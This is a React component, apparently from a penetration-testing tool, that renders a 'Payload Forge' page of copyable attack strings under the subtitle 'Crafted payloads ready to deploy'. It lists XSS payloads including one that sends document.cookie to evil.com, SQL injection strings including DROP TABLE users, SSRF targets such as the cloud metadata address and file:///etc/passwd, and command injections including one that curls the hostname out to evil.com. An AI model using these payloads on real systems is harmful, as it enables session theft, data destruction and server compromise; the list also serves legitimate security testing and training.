import { Terminal, Copy, Check } from "lucide-react";
import AppLayout from "@/components/AppLayout";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

const categories = [
  {
    name: "XSS",
    payloads: [
      `<script>fetch('//evil.com?c='+document.cookie)</script>`,
      `<img src=x onerror=alert(1)>`,
      `"><svg/onload=confirm(1)>`,
      `javascript:eval(atob('YWxlcnQoMSk='))`,
    ],
  },
  {
    name: "SQLi",
    payloads: [
      `' OR '1'='1`,
      `' UNION SELECT NULL,version(),NULL--`,
      `'; DROP TABLE users;--`,
      `' OR SLEEP(5)--`,
    ],
  },
  {
    name: "SSRF",
    payloads: [
      `http://169.254.169.254/latest/meta-data/`,
      `http://localhost:6379/`,
      `gopher://127.0.0.1:25/_HELO`,
      `file:///etc/passwd`,
    ],
  },
  {
    name: "Command Injection",
    payloads: [
      `; cat /etc/passwd`,
      `| whoami`,
      `\`id\``,
      `$(curl evil.com/$(hostname))`,
    ],
  },
];

export default function PayloadForge() {
  const [copied, setCopied] = useState<string | null>(null);
  const { toast } = useToast();

  const copy = (p: string) => {
    navigator.clipboard.writeText(p);
    setCopied(p);
    toast({ title: "Copied", description: "Payload in clipboard" });
    setTimeout(() => setCopied(null), 1500);
  };

  return (
    <AppLayout title="PAYLOAD FORGE" subtitle="Crafted payloads ready to deploy" icon={Terminal}>
      <div className="p-5 grid grid-cols-1 md:grid-cols-2 gap-4">
        {categories.map(cat => (
          <div key={cat.name} className="bg-surface-1 border border-border rounded-lg overflow-hidden">
            <div className="px-4 py-3 border-b border-border flex items-center justify-between">
              <h2 className="text-xs font-mono font-bold text-primary tracking-wider">{cat.name}</h2>
              <span className="text-[10px] font-mono text-muted-foreground">{cat.payloads.length} payloads</span>
            </div>
            <div className="divide-y divide-border">
              {cat.payloads.map(p => (
                <div key={p} className="px-4 py-2.5 flex items-center gap-2 group hover:bg-surface-2">
                  <code className="flex-1 text-[11px] font-mono text-foreground break-all">{p}</code>
                  <button
                    onClick={() => copy(p)}
                    className="opacity-0 group-hover:opacity-100 transition-opacity p-1.5 rounded hover:bg-primary/10 text-primary"
                  >
                    {copied === p ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                  </button>
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>
    </AppLayout>
  );
}
